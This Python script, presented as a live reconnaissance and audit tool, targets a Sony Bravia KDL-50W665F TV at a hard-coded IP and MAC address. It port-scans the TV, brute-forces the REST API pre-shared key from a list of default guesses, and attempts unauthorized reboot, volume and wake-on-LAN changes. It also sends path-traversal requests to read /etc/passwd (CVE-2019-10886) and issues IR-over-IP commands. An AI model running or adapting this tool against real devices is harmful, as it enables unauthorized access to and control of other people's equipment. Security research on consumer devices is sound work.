#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek
"""Sony Bravia KDL-50W665F — Live Network Reconnaissance & Attack Surface Audit.

Performs comprehensive live probing of a Sony Bravia non-Android TV:
  Phase 1a: TCP port discovery
  Phase 1b: REST API (Scalar Web API) enumeration with auth bypass tests
  Phase 1c: Photo Sharing Plus service probe (CVE-2018-16593/16594/16595,
            CVE-2019-10886/11336)
  Phase 1d: SSDP/UPnP discovery and service enumeration
  Phase 1e: DIAL protocol enumeration
  Phase 1f: IRCC (IR over IP) endpoint probe
  Phase 1g: HbbTV / browser endpoint detection

Usage:
    python sony_bravia_live_recon.py --target 192.168.18.6 [--out report.json]

Target: Sony Bravia KDL-50W665F
IP:     192.168.18.6
MAC:    CC:98:8B:D2:80:C8
FW:     v7.631-4.000-0106
"""
import argparse
import json
import os
import socket
import struct
import sys
import time
import tempfile

_PROJECT_TMP = os.path.join(os.path.dirname(__file__), "..", ".tmp")
os.makedirs(_PROJECT_TMP, exist_ok=True)
tempfile.tempdir = _PROJECT_TMP

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests not installed: pip install requests")
    sys.exit(1)

TARGET_IP = "192.168.18.6"
TARGET_MAC = "CC:98:8B:D2:80:C8"

# All TCP ports worth scanning on Sony Bravia non-Android
SCAN_PORTS = [
    80, 443, 548, 1925, 3000, 5000, 7676, 8008, 8080, 8443,
    9000, 9999, 10000, 36866, 52323, 62000, 1900,
]

REST_API_PATHS = [
    "/sony/system",
    "/sony/guide",
    "/sony/avContent",
    "/sony/audio",
    "/sony/videoScreen",
    "/sony/appControl",
    "/sony/recording",
    "/sony/encryption",
    "/sony/browser",
]

REST_METHODS = {
    "getSystemInformation":    {"method": "getSystemInformation",    "params": [],           "id": 1,  "version": "1.0"},
    "getNetworkSettings":      {"method": "getNetworkSettings",      "params": [""],         "id": 2,  "version": "1.0"},
    "getInterfaceInformation": {"method": "getInterfaceInformation", "params": [],           "id": 3,  "version": "1.0"},
    "getRemoteControllerInfo": {"method": "getRemoteControllerInfo", "params": [],           "id": 4,  "version": "1.0"},
    "getPowerStatus":          {"method": "getPowerStatus",          "params": [],           "id": 5,  "version": "1.0"},
    "getCurrentExternalInput": {"method": "getCurrentExternalInputStatus", "params": [],    "id": 6,  "version": "1.0"},
    "getDeviceMode":           {"method": "getDeviceMode",           "params": [],           "id": 7,  "version": "1.0"},
    "getSWInfo":               {"method": "getSWInfo",               "params": [],           "id": 8,  "version": "1.0"},
    "getServiceProtocols":     {"method": "getServiceProtocols",     "params": [],           "id": 9,  "version": "1.0"},
    "getApplicationList":      {"method": "getApplicationList",      "params": [],           "id": 10, "version": "1.0"},
    "getApplicationStatusList":{"method": "getApplicationStatusList","params": [],           "id": 11, "version": "1.0"},
    "getSystemSupportedFunction":{"method":"getSystemSupportedFunction","params":[],         "id": 12, "version": "1.0"},
    "getWolMode":              {"method": "getWolMode",              "params": [],           "id": 13, "version": "1.0"},
    "getLEDIndicatorStatus":   {"method": "getLEDIndicatorStatus",   "params": [],           "id": 14, "version": "1.0"},
    "getSpeakerSettings":      {"method": "getSpeakerSettings",      "params": [{"target":""}], "id":15, "version":"1.1"},
    "getVolumeInformation":    {"method": "getVolumeInformation",    "params": [],           "id": 16, "version": "1.0"},
    "getContentList":          {"method": "getContentList",          "params": [{"source":"tv:isdbt","stIdx":0,"cnt":5}], "id":17, "version":"1.5"},
}

PSK_CANDIDATES = ["0000", "1234", "9999", "sony", "bravia", "", "admin", "password"]

PHOTO_SHARING_PATHS = [
    "/",
    "/photo-share/",
    "/photo-share/status",
    "/photo-share/api/version",
    "/contentshare/",
    "/contentshare/image/",
]

DIAL_APPS = ["YouTube", "Netflix", "AmazonInstantVideo", "Hulu", "system.dial.4k"]


def log(level, msg):
    prefix = {"INFO": "[*]", "OK": "[+]", "WARN": "[!]", "ERR": "[-]"}.get(level, "[?]")
    print("{} {}".format(prefix, msg))


# ─── Phase 1a: TCP Port Scan ────────────────────────────────────────────────

def tcp_port_scan(target, ports, timeout=1.5):
    open_ports = []
    log("INFO", "TCP port scan on {} ({} ports)...".format(target, len(ports)))
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((target, port))
            s.close()
            if result == 0:
                open_ports.append(port)
                log("OK", "  OPEN: {}:{}".format(target, port))
        except Exception:
            pass
    if not open_ports:
        log("WARN", "No open TCP ports found (TV may be in standby)")
    return open_ports


# ─── Phase 1b: REST API Enumeration ─────────────────────────────────────────

def probe_rest_api(target, port=80):
    results = {}
    log("INFO", "Probing REST API on {}:{}...".format(target, port))
    base = "http://{}:{}".format(target, port)

    for psk in PSK_CANDIDATES:
        headers = {
            "Content-Type": "application/json",
            "X-Auth-PSK": psk,
            "User-Agent": "EmbedXPL-Forge/1.0 SonyBraviaAudit",
        }
        body = json.dumps(REST_METHODS["getSystemInformation"]).encode()
        try:
            r = requests.post(base + "/sony/system", data=body, headers=headers, timeout=6, verify=False)
            if r.status_code == 200 and "result" in r.text:
                log("OK", "REST API accessible with PSK='{}' HTTP {}".format(psk, r.status_code))
                results["psk_found"] = psk
                results["system_info_raw"] = r.text
                # Parse system info
                try:
                    data = r.json()
                    if data.get("result"):
                        sinfo = data["result"][0] if data["result"] else {}
                        log("OK", "  Model: {}  FW: {}  MAC: {}".format(
                            sinfo.get("model", "?"),
                            sinfo.get("generation", "?"),
                            sinfo.get("macAddr", "?")
                        ))
                        results["system_info"] = sinfo
                except Exception:
                    pass
                break
            elif r.status_code == 403:
                log("WARN", "  PSK '{}' -> HTTP 403 (auth required)".format(psk))
            elif r.status_code == 200:
                log("WARN", "  PSK '{}' -> HTTP 200 but no 'result' key: {}".format(psk, r.text[:80]))
        except requests.exceptions.ConnectionError:
            log("ERR", "  Connection refused on {}:{} (standby?)".format(target, port))
            results["status"] = "standby_or_offline"
            return results
        except Exception as e:
            log("WARN", "  Error with PSK '{}': {}".format(psk, e))

    if "psk_found" not in results:
        log("WARN", "No PSK worked for REST API")
        return results

    psk = results["psk_found"]
    headers = {"Content-Type": "application/json", "X-Auth-PSK": psk, "User-Agent": "EmbedXPL-Forge/1.0"}

    # Enumerate all REST paths and methods
    log("INFO", "Enumerating {} REST API methods...".format(len(REST_METHODS)))
    method_results = {}
    for method_name, payload in REST_METHODS.items():
        path = "/sony/system"
        if method_name in ("getApplicationList", "getApplicationStatusList", "getSystemSupportedFunction",
                           "getWolMode", "getLEDIndicatorStatus"):
            path = "/sony/appControl"
        elif method_name in ("getSpeakerSettings", "getVolumeInformation"):
            path = "/sony/audio"
        elif method_name == "getServiceProtocols":
            path = "/sony/guide"
        elif method_name == "getContentList":
            path = "/sony/avContent"
        try:
            r = requests.post(base + path, data=json.dumps(payload).encode(), headers=headers, timeout=6, verify=False)
            if r.status_code == 200:
                try:
                    resp_json = r.json()
                    if "result" in resp_json:
                        log("OK", "  {}: OK ({} bytes)".format(method_name, len(r.text)))
                        method_results[method_name] = {"status": "ok", "response": resp_json}
                    elif "error" in resp_json:
                        log("WARN", "  {}: API error {}".format(method_name, resp_json["error"]))
                        method_results[method_name] = {"status": "api_error", "error": resp_json["error"]}
                except Exception:
                    method_results[method_name] = {"status": "parse_error", "raw": r.text[:200]}
            else:
                method_results[method_name] = {"status": "http_{}".format(r.status_code)}
        except Exception as e:
            method_results[method_name] = {"status": "error", "msg": str(e)}
    results["methods"] = method_results

    # Test write methods (unauthorized state change attempts)
    log("INFO", "Testing write methods for unauthorized access...")
    write_attempts = [
        ("/sony/system", {"method": "setPowerSavingMode", "params": [{"mode": "off"}], "id": 50, "version": "1.0"}),
        ("/sony/system", {"method": "setWolMode",          "params": [{"enabled": True}],  "id": 51, "version": "1.0"}),
        ("/sony/audio",  {"method": "setAudioVolume",      "params": [{"target": "speaker", "volume": "0"}], "id": 52, "version": "1.0"}),
        ("/sony/system", {"method": "requestReboot",       "params": [],                    "id": 53, "version": "1.0"}),
    ]
    write_results = {}
    for path, payload in write_attempts:
        method = payload["method"]
        try:
            r = requests.post(base + path, data=json.dumps(payload).encode(), headers=headers, timeout=6, verify=False)
            try:
                resp_j = r.json()
            except Exception:
                resp_j = {"raw": r.text[:100]}
            write_results[method] = {"http_status": r.status_code, "response": resp_j}
            if r.status_code == 200 and "result" in r.text:
                log("OK", "  WRITE {} -> ACCEPTED (potential unauthorized write)".format(method))
            else:
                log("INFO", "  WRITE {} -> HTTP {} {}".format(method, r.status_code, str(resp_j)[:60]))
        except Exception as e:
            write_results[method] = {"status": "error", "msg": str(e)}
    results["write_test"] = write_results

    # Test all REST API paths for undocumented endpoints
    log("INFO", "Probing undocumented REST API paths...")
    undoc_paths = REST_API_PATHS + [
        "/sony/notification", "/sony/cec", "/sony/tv", "/sony/videoScreen",
        "/sony/dial", "/sony/webApp", "/sony/contentShare", "/sony/ircc",
        "/sony/accessControl", "/sony/encryption", "/sony/recording",
        "/sony/", "/", "/cgi-bin/jc.cgi", "/cgi-bin/viewer/GetParam.cgi",
    ]
    endpoint_results = {}
    for path in undoc_paths:
        try:
            # Try GET first
            r = requests.get(base + path, headers=headers, timeout=4, verify=False)
            if r.status_code not in (404, 400):
                log("OK", "  GET {} -> HTTP {}".format(path, r.status_code))
                endpoint_results[path] = {"get": r.status_code, "body_excerpt": r.text[:200]}
            # Try POST
            r2 = requests.post(base + path, data=b'{"method":"getSystemInformation","params":[],"id":1,"version":"1.0"}',
                               headers=headers, timeout=4, verify=False)
            if r2.status_code not in (404, 400):
                endpoint_results.setdefault(path, {})["post"] = r2.status_code
        except Exception:
            pass
    results["endpoints"] = endpoint_results

    return results


# ─── Phase 1c: Photo Sharing Plus ───────────────────────────────────────────

def probe_photo_sharing(target):
    results = {}
    log("INFO", "Probing Photo Sharing Plus (port 10000)...")
    base10k = "http://{}:10000".format(target)
    base80  = "http://{}:80".format(target)

    for base, port_label in [(base10k, "10000"), (base80, "80")]:
        for path in PHOTO_SHARING_PATHS:
            try:
                r = requests.get(base + path, timeout=5, verify=False,
                                 headers={"User-Agent": "EmbedXPL-Forge/1.0"})
                if r.status_code != 404:
                    log("OK", "  Photo Sharing at {}:{}{} HTTP {}".format(target, port_label, path, r.status_code))
                    results["port_{}_{}".format(port_label, path.replace("/", "_"))] = {
                        "status": r.status_code,
                        "body": r.text[:300],
                        "headers": dict(r.headers),
                    }
                    # Check if CVE-2019-10886 traversal path exists
                    if "contentshare" in path or "/" == path:
                        traversal_paths = [
                            "/contentshare/image/../../../etc/passwd",
                            "/contentshare/image/../../../../../../etc/passwd",
                            "/contentshare/image/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                        ]
                        for tp in traversal_paths:
                            try:
                                tr = requests.get(base + tp, timeout=4, verify=False)
                                if tr.status_code == 200 and "root:" in tr.text:
                                    log("OK", "  CVE-2019-10886 CONFIRMED: path traversal read /etc/passwd!")
                                    results["cve_2019_10886"] = {"status": "CONFIRMED", "path": tp, "passwd": tr.text[:500]}
                                elif tr.status_code != 404:
                                    log("WARN", "  Traversal {} -> HTTP {}".format(tp, tr.status_code))
                            except Exception:
                                pass
            except requests.exceptions.ConnectionError:
                log("WARN", "  Port {} refused (Photo Sharing inactive)".format(port_label))
                break
            except Exception as e:
                log("WARN", "  {} -> {}".format(path, e))

    if not results:
        log("WARN", "Photo Sharing Plus not reachable (likely disabled/terminated by Sony update)")
        results["status"] = "not_reachable"

    return results


# ─── Phase 1d: UPnP/SSDP Discovery ──────────────────────────────────────────

def probe_upnp_ssdp(target, timeout=5):
    results = {}
    log("INFO", "Probing UPnP/SSDP...")
    SSDP_ADDR = "239.255.255.250"
    SSDP_PORT = 1900

    search_msg = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 3\r\n"
        "ST: ssdp:all\r\n\r\n"
    ).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.settimeout(timeout)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        sock.sendto(search_msg, (SSDP_ADDR, SSDP_PORT))
        sock.sendto(search_msg, (target, SSDP_PORT))
        end = time.time() + timeout
        devices = []
        while time.time() < end:
            try:
                data, addr = sock.recvfrom(4096)
                resp_text = data.decode("utf-8", errors="replace")
                if addr[0] == target or target in resp_text:
                    log("OK", "  SSDP from {}: {}".format(addr, resp_text[:120]))
                    devices.append({"addr": str(addr), "response": resp_text})
            except socket.timeout:
                break
        results["devices"] = devices
        if not devices:
            log("WARN", "No SSDP responses (TV in standby or service disabled)")
            results["status"] = "no_response"
    finally:
        sock.close()

    # Try fetching UPnP device description XML on known ports
    upnp_urls = [
        "http://{}:52323/dmr.xml".format(target),
        "http://{}:52323/".format(target),
        "http://{}:80/upnp/sony-upnp-desc.xml".format(target),
        "http://{}:1925/upnp/description.xml".format(target),
        "http://{}:7676/".format(target),
    ]
    desc_results = {}
    for url in upnp_urls:
        try:
            r = requests.get(url, timeout=4, verify=False)
            if r.status_code == 200:
                log("OK", "  UPnP descriptor at {} ({} bytes)".format(url, len(r.text)))
                desc_results[url] = {"status": r.status_code, "content": r.text[:1000]}
        except Exception:
            pass
    if desc_results:
        results["descriptors"] = desc_results

    return results


# ─── Phase 1e: DIAL Protocol ─────────────────────────────────────────────────

def probe_dial(target):
    results = {}
    log("INFO", "Probing DIAL protocol (port 36866 / SSDP urn:dial-multiscreen-org)...")

    # SSDP for DIAL
    dial_search = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 3\r\n"
        "ST: urn:dial-multiscreen-org:service:dial:1\r\n\r\n"
    ).encode()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.settimeout(4)
    try:
        sock.sendto(dial_search, ("239.255.255.250", 1900))
        try:
            data, addr = sock.recvfrom(4096)
            resp = data.decode("utf-8", errors="replace")
            log("OK", "  DIAL SSDP from {}: {}".format(addr, resp[:200]))
            results["ssdp"] = {"addr": str(addr), "response": resp}
            # Extract LOCATION header for device description
            for line in resp.split("\r\n"):
                if line.upper().startswith("LOCATION:"):
                    loc_url = line.split(":", 1)[1].strip()
                    results["location"] = loc_url
                    try:
                        lr = requests.get(loc_url, timeout=5, verify=False)
                        results["device_desc"] = lr.text[:2000]
                        log("OK", "  DIAL device desc: {}".format(lr.text[:100]))
                    except Exception as e:
                        log("WARN", "  DIAL location fetch failed: {}".format(e))
        except socket.timeout:
            log("WARN", "No DIAL SSDP response")
    finally:
        sock.close()

    # Try DIAL REST API directly
    dial_base = "http://{}:36866/apps".format(target)
    try:
        r = requests.get(dial_base, timeout=4, verify=False)
        if r.status_code == 200:
            log("OK", "  DIAL apps endpoint: {}".format(r.text[:200]))
            results["apps_endpoint"] = r.text[:500]
    except Exception:
        pass

    for app in DIAL_APPS:
        try:
            r = requests.get("http://{}:36866/apps/{}".format(target, app), timeout=4, verify=False)
            if r.status_code in (200, 201):
                log("OK", "  DIAL app {}: HTTP {} {}".format(app, r.status_code, r.text[:100]))
                results["app_{}".format(app)] = {"status": r.status_code, "body": r.text[:300]}
        except Exception:
            pass

    return results


# ─── Phase 1f: IRCC Probe ────────────────────────────────────────────────────

def probe_ircc(target):
    results = {}
    log("INFO", "Probing IRCC (IR over IP / SOAP)...")
    ircc_body = (
        '<?xml version="1.0"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        '<s:Body>'
        '<u:X_SendIRCC xmlns:u="urn:schemas-sony-com:service:IRCC:1">'
        '<IRCCCode>AAAAAQAAAAEAAABgAw==</IRCCCode>'
        '</u:X_SendIRCC>'
        '</s:Body></s:Envelope>'
    )
    ircc_headers = {
        "Content-Type": "text/xml; charset=UTF-8",
        "SOAPACTION": '"urn:schemas-sony-com:service:IRCC:1#X_SendIRCC"',
    }
    for port in [80, 52323, 8080]:
        try:
            r = requests.post("http://{}:{}/sony/IRCC".format(target, port),
                              data=ircc_body.encode(), headers=ircc_headers, timeout=5, verify=False)
            log("OK" if r.status_code < 400 else "WARN",
                "  IRCC port {} -> HTTP {} {}".format(port, r.status_code, r.text[:80]))
            results["port_{}".format(port)] = {"status": r.status_code, "body": r.text[:300]}
        except requests.exceptions.ConnectionError:
            log("WARN", "  IRCC port {} refused".format(port))
        except Exception as e:
            log("WARN", "  IRCC port {} error: {}".format(port, e))
    return results


# ─── Main ────────────────────────────────────────────────────────────────────

def run_recon(target, output_path=None):
    log("INFO", "=== Sony Bravia Live Recon: {} ===".format(target))
    log("INFO", "Model: KDL-50W665F  FW: v7.631-4.000-0106  MAC: CC:98:8B:D2:80:C8")
    print()

    findings = {
        "target": target,
        "model": "KDL-50W665F",
        "firmware": "v7.631-4.000-0106",
        "mac": TARGET_MAC,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }

    findings["tcp_ports"]     = tcp_port_scan(target, SCAN_PORTS)
    print()
    findings["rest_api"]      = probe_rest_api(target)
    print()
    findings["photo_sharing"] = probe_photo_sharing(target)
    print()
    findings["upnp_ssdp"]    = probe_upnp_ssdp(target)
    print()
    findings["dial"]          = probe_dial(target)
    print()
    findings["ircc"]          = probe_ircc(target)

    # Summary
    print()
    log("INFO", "=== RECON SUMMARY ===")
    open_ports = findings.get("tcp_ports", [])
    if open_ports:
        log("OK", "Open ports: {}".format(open_ports))
    else:
        log("WARN", "No open TCP ports — TV is in standby. Power on TV and run again.")

    psk_found = findings.get("rest_api", {}).get("psk_found")
    if psk_found is not None:
        log("OK", "REST API accessible with PSK: '{}'".format(psk_found))
    else:
        log("WARN", "REST API not accessible")

    if findings.get("photo_sharing", {}).get("cve_2019_10886"):
        log("OK", "CVE-2019-10886 CONFIRMED (path traversal)")

    if output_path:
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(findings, f, indent=2, ensure_ascii=False)
        log("OK", "Findings saved to: {}".format(output_path))

    return findings


def main():
    parser = argparse.ArgumentParser(description="Sony Bravia Live Recon")
    parser.add_argument("--target", default=TARGET_IP, help="Target IP")
    parser.add_argument("--out",    default=None,      help="JSON output path")
    args = parser.parse_args()

    out = args.out
    if not out:
        base = os.path.join(os.path.dirname(__file__), "..", "reports", "sony_bravia_kdl50w665f")
        os.makedirs(base, exist_ok=True)
        out = os.path.join(base, "live_recon_raw.json")

    run_recon(args.target, out)


if __name__ == "__main__":
    main()
